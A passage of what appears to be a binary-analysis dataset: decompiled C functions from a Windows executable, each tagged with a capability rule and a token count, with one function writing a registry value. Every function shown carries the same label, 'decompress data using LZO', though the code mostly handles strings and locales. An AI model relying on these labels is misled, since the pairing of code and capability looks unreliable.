        "decompiled_code": "\nulong fcn.0040d0dc(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040ceac();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 134
    },
    "0040d148": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d148(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    double dStack28;\n    \n    uVar3 = 1;\n    cVar1 = fcn.0040cb60();\n    if (cVar1 == '\\0') {\n        uVar2 = 1;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        if (in_EAX < 1) {\n            uVar2 = 1;\n        }\n        else {\n            uVar2 = fcn.0040ceac();\n        }\n        uVar2 = uVar2 ^ 1;\n    }\n    if (uVar2 == 0) {\n        if (dStack28 < *0x40d1e0) {\n            *param_2 = dStack28 - 0.0;\n        }\n        else {\n            *param_2 = dStack28 + 0.0;\n        }\n    }\n    else {\n        uVar3 = fcn.0040d0dc();\n    }\n    return uVar3;\n}\n",
        "token_count": 275
    },
    "0040d56c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040d56c(void)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack44 = 0x40d73c;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar5 = 1;\n    fcn.0040546c();\n    arg_8h = &fcn.0040d56c::var_8h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040d230(arg_8h);\n    iVar3 = fcn.00409e14();\n    if (iVar3 - 3U < 3) {\n        while (iVar3 = fcn.0040572c(),  iVar5 <= iVar3) {\n            uVar4 = *(in_EAX + -1 + iVar5);\n            if ((*((uVar4 >> 3) + 0x4a1830) >> (uVar4 & 7) & 1) == 0) {\n                iVar3 = fcn.0040a8f8();\n                if (iVar3 == 0) {\n                    fcn.00405738();\n                    iVar5 = iVar5 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040a8f8();\n                    if (iVar3 == 0) {\n                        fcn.00405738();\n                        iVar5 = iVar5 + 3;\n                    }\n                    else {\n                        iVar3 = fcn.0040a8f8();\n                        if (iVar3 == 0) {\n                            fcn.00405738();\n                            iVar5 = iVar5 + 1;\n                        }\n                        else {\n                            cVar1 = *(in_EAX + -1 + iVar5);\n                            if ((cVar1 == 'Y') || (cVar1 == 'y')) {\n                                fcn.00405738();\n                            }\n                            else {\n                                fcn.00405654();\n                                fcn.00405738();\n                            }\n                        }\n                    }\n                }\n                iVar5 = iVar5 + 1;\n            }\n            else {\n                var_4h = fcn.0040e674();\n                arg_8h = &fcn.0040d56c::var_10h;\n                fcn.00405964();\n                fcn.00405738();\n                iVar5 = iVar5 + var_4h;\n            }\n        }\n    }\n    else {\n        if ((*0x4a88cc == 4) || (*0x4a88cc - 0x11U < 2)) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        if (bVar2) {\n            for (; iVar3 = fcn.0040572c(),  iVar5 <= iVar3; iVar5 = iVar5 + 1) {\n                cVar1 = *(in_EAX + -1 + iVar5);\n                if ((cVar1 != 'G') && (cVar1 != 'g')) {\n                    fcn.00405654();\n                    fcn.00405738();\n                }\n            }\n        }\n        else {\n            fcn.004054c0();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack44 = 0x40d743;\n    iStack48 = 0x40d73b;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 886
    },
    "0040e43c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040e43c(void)\n\n{\n    fcn.0040e460();\n    return;\n}\n",
        "token_count": 26
    },
    "0040e460": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e460(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar4 = in_EAX;\n        if (in_EAX != 0) {\n            iVar4 = *(in_EAX + -4);\n        }\n        bVar1 = iVar4 < param_2;\n    }\n    iVar4 = 0;\n    if ((!bVar1) && (iVar4 = param_2,  *0x4a88d4 != '\\0')) {\n        iVar3 = 1;\n        iVar4 = 0;\n        if (0 < param_2) {\n            do {\n                uVar2 = *(in_EAX + -1 + iVar3);\n                if ((*((uVar2 >> 3) + 0x4a1830) >> (uVar2 & 7) & 1) == 0) {\n                    iVar3 = iVar3 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040e6ac();\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar3 <= param_2);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 312
    },
    "0040e4c8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e4c8(int32_t *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    iVar4 = 1;\n    iVar3 = 1;\n    while ((iVar3 < iVar1 && (iVar4 < in_EDX))) {\n        iVar4 = iVar4 + 1;\n        uVar2 = *(in_EAX + -1 + iVar3);\n        if ((*((uVar2 >> 3) + 0x4a1830) >> (uVar2 & 7) & 1) == 0) {\n            iVar3 = iVar3 + 1;\n        }\n        else {\n            iVar3 = fcn.0040e6ac();\n        }\n    }\n    if (((iVar4 == in_EDX) && (iVar3 < iVar1)) &&\n       (uVar2 = *(in_EAX + -1 + iVar3),  (*((uVar2 >> 3) + 0x4a1830) >> (uVar2 & 7) & 1) != 0)) {\n        iVar3 = fcn.0040e6ac();\n        iVar3 = iVar3 + -1;\n    }\n    *in_ECX = iVar4;\n    *arg_8h = iVar3;\n    return;\n}\n",
        "token_count": 378
    },
    "0040e558": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e558(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *in_stack_ffffffe8;\n    int32_t *piVar3;\n    int32_t aiStack20 [2];\n    \n    piVar3 = aiStack20;\n    aiStack20[0] = 0;\n    if (param_2 < 1) {\n        bVar1 = true;\n    }\n    else {\n        iVar2 = in_EAX;\n        if (in_EAX != 0) {\n            iVar2 = *(in_EAX + -4);\n        }\n        bVar1 = iVar2 < param_2;\n    }\n    iVar2 = aiStack20[0];\n    if (((!bVar1) && (iVar2 = param_2,  1 < param_2)) && (iVar2 = param_2,  *0x4a88d4 != '\\0')) {\n        fcn.0040e4c8(aiStack20);\n        if (aiStack20[0] < param_2 + -1) {\n            bVar1 = true;\n        }\n        else {\n            if (in_EAX != 0) {\n                in_EAX = *(in_EAX + -4);\n            }\n            bVar1 = in_EAX <= piVar3;\n        }\n        iVar2 = aiStack20[0];\n        if (bVar1) {\n            in_stack_ffffffe8 = NULL;\n        }\n        else {\n            in_stack_ffffffe8 = piVar3 + 1;\n        }\n    }\n    aiStack20[0] = iVar2;\n    return CONCAT44(aiStack20[0], in_stack_ffffffe8);\n}\n",
        "token_count": 389
    },
    "0040e5dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e5dc(uint param_1, uchar *param_2)\n\n{\n    uchar *in_EAX;\n    uchar *puVar1;\n    uchar *puVar2;\n    uchar *in_stack_ffffffec;\n    uchar **ppuVar3;\n    uchar *apuStack16 [2];\n    \n    ppuVar3 = apuStack16;\n    apuStack16[0] = NULL;\n    puVar1 = apuStack16[0];\n    if (0 < param_2) {\n        puVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            puVar1 = *(in_EAX + -4);\n        }\n        if ((puVar1 < param_2) && (param_2 = in_EAX,  in_EAX != NULL)) {\n            param_2 = *(in_EAX + -4);\n        }\n        puVar1 = param_2;\n        if (*0x4a88d4 != '\\0') {\n            fcn.0040e4c8(apuStack16);\n            puVar2 = in_EAX;\n            if (in_EAX != NULL) {\n                puVar2 = *(in_EAX + -4);\n            }\n            in_stack_ffffffec = ppuVar3;\n            puVar1 = apuStack16[0];\n            if ((puVar2 < ppuVar3) && (in_stack_ffffffec = in_EAX,  in_EAX != NULL)) {\n                in_stack_ffffffec = *(in_EAX + -4);\n            }\n        }\n    }\n    apuStack16[0] = puVar1;\n    return CONCAT44(apuStack16[0], in_stack_ffffffec);\n}\n",
        "token_count": 376
    },
    "0040e6e4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e6e4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    if (param_2 < 1) {\n        bVar3 = false;\n    }\n    else {\n        iVar1 = in_EAX;\n        if (in_EAX != 0) {\n            iVar1 = *(in_EAX + -4);\n        }\n        bVar3 = param_2 <= iVar1;\n    }\n    if (bVar3) {\n        bVar3 = *(in_EAX + -1 + param_2) == '\\\\';\n    }\n    else {\n        bVar3 = false;\n    }\n    if (bVar3) {\n        uVar2 = fcn.0040e400();\n        return uVar2 & 0xffffff00 | uVar2 == '\\0';\n    }\n    return 0;\n}\n",
        "token_count": 217
    },
    "0040e72c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e72c(uint param_1)\n\n{\n    char cVar1;\n    \n    fcn.004054c0(param_1);\n    cVar1 = fcn.0040e6e4();\n    if (cVar1 == '\\0') {\n        fcn.00405738();\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "0040e778": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e778(uint param_1)\n\n{\n    char cVar1;\n    \n    fcn.004054c0(param_1);\n    cVar1 = fcn.0040e6e4();\n    if (cVar1 != '\\0') {\n        fcn.00405b8c();\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0040e800": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e800(uint param_1, int32_t *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    if (*0x4a88d4 == '\\0') {\n        uVar4 = fcn.004099dc();\n    }\n    else {\n        iVar3 = in_EAX;\n        if (in_EAX != 0) {\n            iVar3 = *(in_EAX + -4);\n        }\n        uVar4 = fcn.00405b8c();\n        iVar6 = 1;\n        if (0 < iVar3) {\n            do {\n                iVar5 = fcn.0040595c();\n                *(iVar5 + -1 + iVar6) = *(in_EAX + -1 + iVar6);\n                uVar4 = *(in_EAX + -1 + iVar6);\n                if ((*((uVar4 >> 3) + 0x4a1830) >> (uVar4 & 7) & 1) == 0) {\n                    cVar2 = *(*param_2 + -1 + iVar6);\n                    uVar4 = cVar2 + 0xa5;\n                    if (cVar2 + 0xbfU < 0x1a) {\n                        uVar4 = fcn.0040595c();\n                        pcVar1 = (uVar4 - 1) + iVar6;\n                        *pcVar1 = *pcVar1 + ' ';\n                    }\n                }\n                else {\n                    iVar6 = iVar6 + 1;\n                    uVar4 = fcn.0040595c();\n                    *((uVar4 - 1) + iVar6) = *(in_EAX + -1 + iVar6);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 <= iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 445
    },
    "0041143c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041143c(int32_t arg_8h, uint16_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint pvarg;\n    uint *var_8h;\n    int32_t *var_4h;\n    \n    if (*arg_ch == 0x400c) {\n        fcn.0041143c(arg_8h, *(arg_ch + 4), arg_10h, arg_14h);\n        return;\n    }\n    if (arg_8h == 0) {\n        var_8h = NULL;\n    }\n    else {\n        sub.oleaut32.dll_VariantInit();\n        var_8h = &pvarg;\n    }\n    uVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uVar1 = *arg_ch;\n    if (uVar1 < 0x102) {\n        if ((uVar1 == 0x101) || ((uVar1 == 9 || (uVar1 == 0xd)))) {\ncode_r0x004114bc:\n            if (*0x4aa97c != NULL) {\n                (**0x4aa97c)(var_8h, arg_ch, arg_10h, &arg_14h);\n            }\n            goto code_r0x00411507;\n        }\n    }\n    else if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) goto code_r0x004114bc;\n    cVar2 = fcn.00415f5c();\n    if (cVar2 == '\\0') {\n        fcn.00410cd8();\n    }\n    else {\n        (**(*var_4h + 0x10))(&arg_14h, arg_10h);\n    }\ncode_r0x00411507:\n    *in_FS_OFFSET = uVar3;\n    if (var_8h != NULL) {\n        fcn.0041184c();\n        fcn.00411420();\n    }\n    return;\n}\n",
        "token_count": 478
    },
    "00415514": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415514(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    \n    uVar1 = *param_2;\n    if (uVar1 < 0xe) {\n        if (uVar1 != 0xd) {\n            if (uVar1 == 0) {\n                fcn.00406f3c();\n                return;\n            }\n            if (uVar1 == 1) {\n                if (*0x4a1a54 != '\\0') {\n                    fcn.00410c3c();\n                }\n                fcn.00406f3c();\n                return;\n            }\n            if (uVar1 != 9) goto code_r0x00415595;\n        }\n        fcn.00406f54();\n    }\n    else {\n        if (uVar1 == 0x101) {\n            fcn.0041549c(param_1);\n            return;\n        }\n        if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) {\n            fcn.00406f54();\n            return;\n        }\ncode_r0x00415595:\n        cVar2 = fcn.00415f5c();\n        if (cVar2 != '\\0') {\n            fcn.00406f3c();\n            cVar2 = fcn.004046f4();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.00410c3c();\n    }\n    return;\n}\n",
        "token_count": 347
    },
    "004164b8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004164b8(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x416547;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.004162bc();\n    cVar1 = *in_EAX;\n    if (cVar1 == '\\x01') {\n        puStack36 = 0x4164f4;\n        fcn.00409dd8();\n    }\n    else if ((cVar1 == '\\x02') || (cVar1 == '\\t')) {\n        puStack36 = &fcn.004164b8::var_4h;\n        fcn.00405964();\n        fcn.00409dd8();\n    }\n    else {\n        puStack36 = 0x41652f;\n        fcn.00416314();\n    }\n    *in_FS_OFFSET = puStack36;\n    uStack28 = 0x41654e;\n    iStack32 = 0x416546;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 308
    },
    "0041a3dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041a49f)\n// WARNING: Removing unreachable block (ram,0x0041a449)\n// WARNING: Removing unreachable block (ram,0x0041a455)\n// WARNING: Removing unreachable block (ram,0x0041a4c1)\n// WARNING: Removing unreachable block (ram,0x0041a4aa)\n// WARNING: Removing unreachable block (ram,0x0041a4cc)\n\nvoid fcn.0041a3dc(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x41a505;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    fcn.0041acd8();\n    iVar2 = iVar1;\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0040555c();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x41a50c;\n    uStack60 = 0x41a4f7;\n    fcn.0040546c();\n    uStack60 = 0x41a504;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 487
    },
    "0041a9c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041a9ee)\n\nvoid fcn.0041a9c4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41aa15;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + 0x1c))();\n    fcn.0041b6f0();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41aa1c;\n    uStack24 = 0x41aa14;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 193
    },
    "0041aaac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ab92)\n\nvoid __fastcall fcn.0041aaac(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x41ac35;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x41aade;\n    fcn.0041a084();\n    uStack68 = 0x41ac03;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    (**(*in_EAX + 0x44))();\n    if (param_2 != NULL) {\n        fcn.0041acd8();\n        iVar2 = fcn.004097e8();\n        if (iVar2 == 0) {\n            while (*param_2 != '\\0') {\n                for (; ((cVar1 = *param_2,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r')); param_2 = param_2 + 1\n                    ) {\n                }\n                fcn.0040555c();\n                (**(*in_EAX + 0x38))();\n                if (*param_2 == '\\r') {\n                    param_2 = param_2 + 1;\n                }\n                if (*param_2 == '\\n') {\n                    param_2 = param_2 + 1;\n                }\n            }\n        }\n        else {\n            if (*(*0x4a5178 + 0xc) == '\\0') {\n                var_10h = fcn.0040a950;\n            }\n            else {\n                var_10h = fcn.0040e894;\n            }\n            fcn.0041acd8();\n            while (*param_2 != '\\0') {\n                fcn.0041acd8();\n                fcn.004058fc();\n                pcVar3 = (*var_10h)();\n                for (; (*param_2 != '\\0' && (pcVar3 != param_2)); param_2 = param_2 + 1) {\n                }\n                fcn.0040555c();\n                (**(*in_EAX + 0x38))();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x41ac0a;\n    uStack68 = 0x41ac02;\n    fcn.0041a140();\n    return;\n}\n",
        "token_count": 695
    },
    "0041bea0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0041bea0(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004058fc();\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 48
    },
    "0041cdfc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ce23)\n// WARNING: Removing unreachable block (ram,0x0041ce2b)\n\nvoid fcn.0041cdfc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41ce4c;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    fcn.0041e728();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41ce53;\n    uStack20 = 0x41ce4b;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 183
    },
    "0041db64": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041dbb9)\n\nvoid __fastcall fcn.0041db64(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack56 = &stack0xfffffffc;\n    uStack48 = 0x41ddac;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x41dd5e;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = 0x41db9f;\n    fcn.0041e6ec();\n    uStack72 = 0x41dd37;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar3 = 1;\n    *(in_EAX + 0x88) = 1;\n    var_14h = param_2;\n    puStack68 = &stack0xfffffffc;\n    while( true ) {\n        for (; (iVar3 < 1 && (*(iVar3 + -1) != '.')); iVar3 = iVar3 + 1) {\n        }\n        iStack76 = in_EAX + 0x80;\n        fcn.00405964();\n        if (0 < iVar3) break;\n        fcn.00404880();\n        puVar2 = fcn.00416378();\n        if (puVar2 == NULL) {\n            fcn.004054c0();\n            *(in_EAX + 0x88) = 0;\n            (**(*var_14h + 4))();\n            *(in_EAX + 0x88) = 1;\n            if (*(in_EAX + 0x80) != 0) {\n                fcn.0041cd4c();\n            }\n            *in_FS_OFFSET = iStack76;\n            *in_FS_OFFSET = iStack64;\ncode_r0x0041dd96:\n            *in_FS_OFFSET = iStack52;\n            puStack44 = 0x41ddb3;\n            uStack48 = 0x41ddab;\n            fcn.0040546c();\n            return;\n        }\n        var_18h = NULL;\n        if (***puVar2 == '\\a') {\n            var_18h = fcn.004163e8();\n        }\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            fcn.0041db48(&stack0xfffffffc);\n        }\n        var_14h = var_18h;\n        iVar3 = iVar3 + 1;\n    }\n    fcn.00404880();\n    iVar3 = fcn.00416378();\n    if (iVar3 == 0) {\n        *(in_EAX + 0x88) = 0;\n        (**(*var_14h + 4))();\n        *(in_EAX + 0x88) = 1;\n        if (*(in_EAX + 0x80) != 0) {\n            fcn.0041cd4c();\n        }\n    }\n    else {\n        fcn.0041df60();\n    }\n    *in_FS_OFFSET = iStack76;\n    *in_FS_OFFSET = iStack64;\n    goto code_r0x0041dd96;\n}\n",
        "token_count": 875
    },
    "0041f310": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f310(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    \n    bVar1 = *0x10 == 0x14;\n    fcn.00405894();\n    if (bVar1) {\n        if (param_2 != 0) {\n            param_2 = *(param_2 + -4);\n        }\n        if (param_2 < 0x100) {\n            fcn.0041f410();\n            fcn.0041f214();\n        }\n        else {\n            fcn.0041f410();\n            fcn.0041f214();\n        }\n        fcn.0041f214();\n    }\n    else {\n        fcn.0041f410();\n        fcn.0041f214();\n        fcn.0041f214();\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "0042147c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042147c(int32_t param_1)\n\n{\n    uint arg_8h;\n    \n    if (param_1 != 0) {\n        param_1 = *(param_1 + -4);\n    }\n    param_1 = param_1 + 1;\n    arg_8h = 1;\n    fcn.004058fc();\n    fcn.004215fc(arg_8h, param_1);\n    return;\n}\n",
        "token_count": 102
    },
    "004214ac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004214ac(int32_t param_1)\n\n{\n    uint arg_8h;\n    \n    if (param_1 != 0) {\n        param_1 = *(param_1 + -4);\n    }\n    param_1 = param_1 + 1;\n    arg_8h = 2;\n    fcn.004058fc();\n    fcn.004215fc(arg_8h, param_1);\n    return;\n}\n",
        "token_count": 101
    },
    "00421e28": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421e28(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x421e40;\n    fcn.004058ec();\n    puStack28 = 0x421e48;\n    fcn.004058ec();\n    puStack28 = 0x421e50;\n    fcn.004058ec();\n    uStack32 = 0x421ed1;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004058fc(&fcn.00421e28::hKey);\n    sub.advapi32.dll_RegCreateKeyA();\n    if (arg_8h != 0) {\n        arg_8h = *(arg_8h + -4);\n    }\n    uVar1 = fcn.004058fc(arg_8h);\n    uVar1 = fcn.004058fc(0, 2, uVar1);\n    sub.advapi32.dll_RegSetValueExA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405490(0x421ed8);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 337
    },
    "00423184": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00423255)\n// WARNING: Removing unreachable block (ram,0x0042326b)\n\nvoid __fastcall fcn.00423184(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uVar4;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint lpBuffer;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    uint nSize;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack108 = 0x4231b1;\n    var_10h = param_2;\n    fcn.00405f08();\n    uStack112 = 0x423325;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    puStack108 = &stack0xfffffffc;\n    if (*0x4a1b64 == NULL) {\n        puStack108 = &stack0xfffffffc;\n        fcn.0040dab4();\n        